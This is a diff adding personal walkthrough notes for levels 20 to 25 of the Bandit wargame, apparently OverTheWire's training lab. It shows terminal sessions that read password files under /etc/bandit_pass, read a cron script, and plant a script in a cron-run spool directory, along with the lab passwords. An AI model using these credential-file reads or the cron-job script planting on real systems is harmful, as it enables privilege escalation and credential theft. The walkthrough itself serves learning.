@@ -481,3 +481,48 @@ Run a command as another user.
   Example: ./bandit20-do whoami
 bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
 password - 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
+
+level 20 - 21
+4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
+
+password for level 21 -: bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
+
+level 21 -22
+password -: RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
+
+level 22 - 23
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:~$ echo I am user bandit23 | md5sum
+8ca319486bfbbc3663ea0fbe81326349  -
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+bandit22@bandit:~$
+password -: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+
+level 23 - 24
+bandit23@bandit:/tmp/bandit23$ chmod 777 /tmp/bandit23
+bandit23@bandit:/tmp/bandit23$ ls -ld /tmp/bandit23
+drwxrwxrwx 2 bandit23 bandit23 60 Aug 30 09:29 /tmp/bandit23
+bandit23@bandit:/tmp/bandit23$ cp getpass.sh /var/spool/bandit24/foo/
+bandit23@bandit:/tmp/bandit23$ ls -l /tmp/bandit23
+total 8
+-rwxrwxrwx 1 bandit23 bandit23 67 Aug 30 09:29 getpass.sh
+-rw-rw-r-- 1 bandit24 bandit24 33 Aug 30 09:33 password
+bandit23@bandit:/tmp/bandit23$ cat /tmp/bandit23/password
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
+password -: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
+level 24 - 25
+The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
